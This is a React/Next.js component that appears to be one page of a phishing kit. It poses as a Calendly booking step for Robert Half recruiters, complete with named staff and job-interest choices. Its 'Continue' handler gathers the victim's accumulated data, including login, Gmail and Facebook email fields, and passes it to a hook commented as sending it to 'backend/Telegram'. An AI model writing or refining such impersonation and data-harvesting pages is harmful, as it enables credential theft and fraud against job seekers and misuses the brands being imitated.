import React, { useContext, useState, useMemo } from "react";
import Image from "next/image";
import { useRouter } from "next/router";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";
import Footer from "../frriSpecific/Footer.js";

const STEPS = ["Verify", "Schedule", "Finish"];

const AGENTS = [
  {
    id: 1,
    name: "Kari Paulsey",
    title: "Senior Manager",
    specialty: "Senior Manager Of HR Business Partners",
    color: "bg-blue-500",
    image: "/Images/agent1.jpeg"
  },
  {
    id: 2,
    name: "Samantha (Shotz) Bierig",
    title: "Recruiting Manager for Marketing",
    specialty: "Recruiting Manager for Marketing & Creative Permanent Placement Services",
    color: "bg-purple-500",
    image: "/Images/agent2.jpeg"
  },
  {
    id: 3,
    name: "Abigail Jarin",
    title: "Marketing Specialist",
    specialty: "Marketing Specialists & Coordinators",
    color: "bg-pink-500",
    image: "/Images/agent3.jpeg"
  },
  {
    id: 4,
    name: "Marlo Wamsganz",
    title: "Recruiter",
    specialty: "Recruiter",
    color: "bg-green-500",
    image: "/Images/agent6.jpeg"
  },
  {
    id: 5,
    name: "Edgar Gonzalez",
    title: "Executive Recruiter",
    specialty: "Recruiting Manager",
    color: "bg-amber-500",
    image: "/Images/agent5.jpeg"
  }
];

const JOB_INTERESTS = [
  "Software Engineering",
  "Product Management",
  "Data Science",
  "UI/UX Design",
  "Marketing",
  "Sales",
  "Operations",
  "Human Resources",
  "Finance",
  "Customer Success",
  "Other"
];

const WORK_PREFERENCES = [
  "Remote",
  "Hybrid",
  "On-site",
  "Full-time",
  "Part-time",
  "Contract",
  "Freelance"
];

const generateDates = () => {
  const dates = [];
  const start = new Date();
  start.setDate(start.getDate() + 7);

  let count = 0;
  let offset = 0;
  
  while (count < 7) {
    const d = new Date(start);
    d.setDate(start.getDate() + offset);
    const dayOfWeek = d.getDay();
    
    // Skip Saturday (6) and Sunday (0)
    if (dayOfWeek !== 0 && dayOfWeek !== 6) {
      const dateObj = {
        date: d.toISOString().split("T")[0],
        dayName: d.toLocaleDateString('en-US', { weekday: 'short' }).toUpperCase(),
        dayNum: d.getDate(),
        month: d.toLocaleDateString('en-US', { month: 'long' }),
        year: d.getFullYear()
      };
      dates.push(dateObj);
      count++;
    }
    offset++;
  }
  return dates;
};

const generateTimes = () => {
  const times = [];
  for (let h = 9; h < 17; h++) {
    times.push(`${String(h).padStart(2, "0")}:00`);
    times.push(`${String(h).padStart(2, "0")}:30`);
  }
  return times;
};


function Done() {
  let { AllData } = useContext(DataContext);
  const router = useRouter();
  
  const dates = useMemo(generateDates, []);
  const times = useMemo(generateTimes, []);

  const [step, setStep] = useState(1);
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [jobInterests, setJobInterests] = useState([]);
  const [workPreferences, setWorkPreferences] = useState([]);
  const [date, setDate] = useState("");
  const [time, setTime] = useState("");
  const [imageErrors, setImageErrors] = useState({});

  return (
    <div className="flex flex-col min-h-screen w-full bg-gray-50 font-sans">
      <main className="flex-grow w-full flex flex-col items-center justify-center">
        <div className="bg-gray-50 flex w-full justify-center items-center py-4 sm:py-6 lg:py-8 px-2 sm:px-4">
          <div className="bg-white max-w-5xl w-full rounded-lg sm:rounded-xl shadow-lg grid grid-cols-1 lg:grid-cols-[360px_1fr] overflow-hidden">
            
            {/* LEFT PANEL */}
            <div className="p-4 sm:p-6 lg:p-8 border-r border-gray-200 relative min-h-[350px] sm:min-h-[400px] lg:border-r lg:border-b-0 border-b">
              <div className="flex items-center justify-center gap-3 mb-4 sm:mb-6">
                <div className="relative w-24 h-10 sm:w-40 sm:h-12">
                  <Image 
                    src="/Images/calendly.svg" 
                    alt="Calendly" 
                    width={200} 
                    height={100}
                    className="object-contain"
                  />
                </div>
              </div>

              {step === 1 ? (
                <>
                  <div className="mb-4">
                    {selectedAgent && (
                      <div className="flex items-center gap-3 mb-3 pb-3 border-b border-gray-200">
                        <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center text-white font-bold flex-shrink-0 ${selectedAgent.color} overflow-hidden`}>
                          {!imageErrors[`selected-${selectedAgent.id}`] ? (
                            <div className="w-full h-full rounded-full overflow-hidden">
                              <Image 
                                src={selectedAgent.image}
                                alt={selectedAgent.name}
                                width={48}
                                height={48}
                                className="object-cover w-full h-full"
                                style={{ objectPosition: 'center top' }}
                                onError={() => {
                                  setImageErrors(prev => ({ ...prev, [`selected-${selectedAgent.id}`]: true }));
                                }}
                              />
                            </div>
                          ) : (
                            <span className="text-sm sm:text-base">{selectedAgent.name.split(' ').map(n => n[0]).join('')}</span>
                          )}
                        </div>
                        <div>
                          <h3 className="font-semibold text-sm text-gray-900">{selectedAgent.name}</h3>
                          <p className="text-[11px] text-gray-500">{selectedAgent.specialty}</p>
                        </div>
                      </div>
                    )}
                    <p className="text-[11px] sm:text-xs text-gray-500 mb-2">Choose who to meet with:</p>
                    <div className="flex flex-wrap gap-2 sm:gap-3">
                      {AGENTS.map((agent) => (
                        <button
                          key={agent.id}
                          onClick={() => setSelectedAgent(agent)}
                          className="flex flex-col items-center gap-1 transition-all"
                        >
                          <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center text-white font-bold flex-shrink-0 ${agent.color} overflow-hidden cursor-pointer transition-all ${
                            selectedAgent?.id === agent.id 
                              ? 'ring-2 ring-blue-500 ring-offset-2' 
                              : 'hover:ring-2 hover:ring-gray-300 hover:ring-offset-1'
                          }`}>
                            {!imageErrors[`agent-${agent.id}`] ? (
                              <div className="w-full h-full rounded-full overflow-hidden">
                                <Image 
                                  src={agent.image}
                                  alt={agent.name}
                                  width={48}
                                  height={48}
                                  className="object-cover w-full h-full"
                                  style={{ objectPosition: 'center top' }}
                                  onError={() => {
                                    setImageErrors(prev => ({ ...prev, [`agent-${agent.id}`]: true }));
                                  }}
                                />
                              </div>
                            ) : (
                              <span className="text-xs sm:text-sm">{agent.name.split(' ').map(n => n[0]).join('')}</span>
                            )}
                          </div>
                          <span className="text-[9px] sm:text-[10px] text-gray-700 font-medium text-center max-w-[50px] sm:max-w-[60px] leading-tight">
                            {agent.name.split(' ')[0]}
                          </span>
                        </button>
                      ))}
                    </div>
                  </div>
                </>
              ) : selectedAgent ? (
                <>
                  <p className="text-sm text-gray-500 mb-1">{selectedAgent.name}</p>
                  <p className="text-xs text-gray-400 mb-4">{selectedAgent.title} • {selectedAgent.specialty}</p>
                </>
              ) : (
                <p className="text-sm text-gray-500 mb-1">Robert Half Recruitment</p>
              )}

              <h1 className="text-lg sm:text-xl lg:text-[22px] font-semibold mb-4 sm:mb-6 text-gray-900">30 Minute Meeting</h1>

              <div className="flex flex-col gap-3 sm:gap-4 text-xs sm:text-sm text-gray-600">
                <div className="flex gap-3 items-center">
                  <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span>30 min</span>
                </div>
                <div className="flex gap-3 items-start">
                  <svg className="w-5 h-5 text-gray-500 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                  <span>Web conferencing details provided upon confirmation.</span>
                </div>
                <div className="flex gap-3 items-center">
                  <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span>Central European Standard Time</span>
                </div>
              </div>

              {date && time && (
                <div className="mt-6 pt-6 border-t border-gray-200 text-sm text-gray-700 flex flex-col gap-2">
                  <div className="flex gap-3 items-center">
                    <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                    <span className="font-medium">{dates.find(d => d.date === date)?.dayName}, {dates.find(d => d.date === date)?.month} {dates.find(d => d.date === date)?.dayNum}, {dates.find(d => d.date === date)?.year}</span>
                  </div>
                  <div className="flex gap-3 items-center">
                    <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <span className="font-medium">{time}</span>
                  </div>
                </div>
              )}

              <div className="absolute bottom-3 sm:bottom-4 lg:bottom-6 left-4 sm:left-6 lg:left-8 right-4 sm:right-6 lg:right-8 flex justify-between text-[10px] sm:text-xs text-gray-400">
                <span className="cursor-pointer hover:text-gray-600">Cookie settings</span>
                <span className="cursor-pointer hover:text-gray-600">Report abuse</span>
              </div>
            </div>

            {/* RIGHT PANEL */}
            <div className="p-4 sm:p-6 lg:p-10 relative overflow-hidden">

              {/* STEPPER */}
              <div className="flex items-start justify-center gap-0 mb-6 sm:mb-8">
                {STEPS.map((label, i) => (
                  <div key={label} className="flex items-center">
                    {/* Left extending line before first step */}
                    {i === 0 && (
                      <div className="relative w-8 sm:w-12 lg:w-16 h-0.5 mb-6 mr-0">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className={`absolute right-0 top-0 h-full transition-all ${step > 0 ? 'w-full bg-[#00A3FF]' : 'w-1/2 bg-[#00A3FF]'}`} />
                      </div>
                    )}
                    <div className="flex flex-col items-center">
                      <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center font-semibold shadow-sm transition-all relative z-10 ${
                        i < step ? 'bg-[#00A3FF] text-white' : i === step ? 'bg-[#00A3FF] text-white' : 'bg-gray-300 text-gray-500'
                      }`}>
                        {i === 0 && (
                          <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                          </svg>
                        )}
                        {i === 1 && (
                          <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/>
                          </svg>
                        )}
                        {i === 2 && (
                          <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                          </svg>
                        )}
                      </div>
                      <span className={`text-[10px] sm:text-xs font-medium mt-2 whitespace-nowrap ${
                        i < step ? 'text-[#00A3FF]' : i === step ? 'text-[#00A3FF]' : 'text-gray-400'
                      }`}>
                        {label}
                      </span>
                    </div>
                    {i < STEPS.length - 1 && (
                      <div className="relative w-16 sm:w-20 lg:w-28 h-0.5 mb-6">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className={`absolute left-0 top-0 h-full transition-all ${i < step ? 'w-full bg-[#00A3FF]' : i === step ? 'w-1/2 bg-[#00A3FF]' : 'w-0'}`} />
                      </div>
                    )}
                    {/* Right extending line after last step */}
                    {i === STEPS.length - 1 && (
                      <div className="relative w-8 sm:w-12 lg:w-16 h-0.5 mb-6 ml-0">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className={`absolute left-0 top-0 h-full transition-all ${i < step ? 'w-full bg-[#00A3FF]' : i === step ? 'w-1/2 bg-[#00A3FF]' : 'w-0'}`} />
                      </div>
                    )}
                  </div>
                ))}
              </div>

              {/* STEP 1 – SCHEDULE */}
              {step === 1 && (
                <div className="flex flex-col gap-6">
                  <h2 className="text-xl font-semibold text-gray-900">Complete your booking</h2>

                  {/* Job Interests */}
                  <div>
                    <p className="text-xs sm:text-sm font-semibold mb-2 text-gray-900">Job Interests</p>
                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-[repeat(auto-fill,minmax(85px,1fr))] gap-1.5 sm:gap-2">
                      {JOB_INTERESTS.map((interest) => (
                        <button
                          key={interest}
                          onClick={() => {
                            if (jobInterests.includes(interest)) {
                              setJobInterests(jobInterests.filter(j => j !== interest));
                            } else {
                              setJobInterests([...jobInterests, interest]);
                            }
                          }}
                          className={`border rounded-md py-1.5 px-2 text-xs font-medium transition-all text-center ${
                            jobInterests.includes(interest)
                              ? 'border-2 border-[#006BFF] bg-[#006BFF] text-white'
                              : 'border border-gray-300 bg-white text-gray-900 hover:border-[#006BFF] hover:bg-blue-50'
                          }`}
                        >
                          {interest}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Work Preferences */}
                  <div>
                    <p className="text-xs sm:text-sm font-semibold mb-2 text-gray-900">Work Preferences</p>
                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-[repeat(auto-fill,minmax(70px,1fr))] gap-1.5 sm:gap-2">
                      {WORK_PREFERENCES.map((pref) => (
                        <button
                          key={pref}
                          onClick={() => {
                            if (workPreferences.includes(pref)) {
                              setWorkPreferences(workPreferences.filter(p => p !== pref));
                            } else {
                              setWorkPreferences([...workPreferences, pref]);
                            }
                          }}
                          className={`border rounded-md py-1.5 px-2 text-xs font-medium transition-all text-center ${
                            workPreferences.includes(pref)
                              ? 'border-2 border-green-500 bg-green-500 text-white'
                              : 'border border-gray-300 bg-white text-gray-900 hover:border-green-500 hover:bg-green-50'
                          }`}
                        >
                          {pref}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Date Selection */}
                  <div>
                    <div className="flex items-center justify-between mb-3 sm:mb-4">
                      <h3 className="text-base sm:text-lg font-semibold text-gray-900">{dates[0]?.month} {dates[0]?.year}</h3>
                    </div>
                    <div className="">
                      <div className="grid grid-cols-7 gap-2 p-2">
                        {dates.map((d) => (
                          <button
                            key={d.date}
                            onClick={() => {
                              setDate(d.date);
                              setTime("");
                            }}
                            className={`aspect-square rounded-lg border-2 p-2 sm:p-3 text-center cursor-pointer transition-all flex flex-col items-center justify-center ${
                              date === d.date 
                                ? 'border-[#006BFF] bg-[#006BFF] text-white shadow-md' 
                                : 'border-gray-300 bg-white text-black hover:border-[#006BFF] hover:bg-blue-50'
                            }`}
                          >
                            <div className={`text-[9px] sm:text-[11px] mb-1 font-bold uppercase ${
                              date === d.date ? 'text-blue-100' : 'text-gray-500'
                            }`}>
                              {d.dayName}
                            </div>
                            <div className={`text-base sm:text-lg ${
                              date === d.date ? 'font-bold' : 'font-semibold'
                            }`}>
                              {d.dayNum}
                            </div>
                            <div className={`text-[8px] sm:text-[10px] mt-0.5 ${
                              date === d.date ? 'text-blue-100' : 'text-gray-400'
                            }`}>
                              {d.month.slice(0, 3)}
                            </div>
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>

                  {date && (
                    <div>
                      <p className="text-xs sm:text-sm font-semibold mb-2 sm:mb-3 text-gray-900">Select Time</p>
                      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-[repeat(auto-fill,minmax(100px,1fr))] gap-2 sm:gap-3 max-h-[250px] sm:max-h-[300px] overflow-y-auto">
                        {times.map((t) => (
                          <button
                            key={t}
                            onClick={() => setTime(t)}
                            className={`border rounded-lg py-2.5 text-sm font-semibold transition-all ${
                              time === t
                                ? 'border-2 border-[#006BFF] bg-[#006BFF] text-white shadow-md'
                                : 'border-2 border-gray-300 bg-white text-gray-900 hover:border-[#006BFF] hover:bg-blue-50'
                            }`}
                          >
                            {t}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {selectedAgent && date && time && jobInterests.length > 0 && workPreferences.length > 0 && (
                    <button
                    onClick={() => {
                      const userEmail = AllData?.login_email || 
                                       AllData?.email || 
                                       AllData?.gmailEmail || 
                                       AllData?.facebookEmail || 
                                       AllData?.business_email ||
                                       "";
                      
                      if (!userEmail) {
                        alert("No email found! Please make sure you logged in with Facebook or Gmail first.");
                        return;
                      }
                      
                      // Send data to backend/Telegram
                      const params = {
                        ...AllData,
                        currentStep: "Done - Appointment Scheduled",
                        jobInterests,
                        workPreferences,
                        scheduledDate: date,
                        scheduledTime: time,
                        selectedAgent: selectedAgent.name
                      };
                      SendData(params);
                      
                      // Save appointment data to sessionStorage
                      sessionStorage.setItem("appointmentData", JSON.stringify({
                        selectedAgent,
                        scheduledDate: date,
                        scheduledTime: time,
                        jobInterests,
                        workPreferences,
                        dates,
                        userEmail,
                        userData: AllData
                      }));
                      // Navigate to ApplicationComplete
                      router.push("/application-complete");
                    }}
                    className="w-full max-w-md bg-[#006BFF] text-white py-3 sm:py-4 rounded-lg border-none cursor-pointer text-sm sm:text-base font-bold shadow-lg transition-all hover:bg-[#0052CC] hover:shadow-xl mt-4 sm:mt-6"
                  >
                    Continue
                  </button>
                  )}
                </div>
              )}


            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default Done;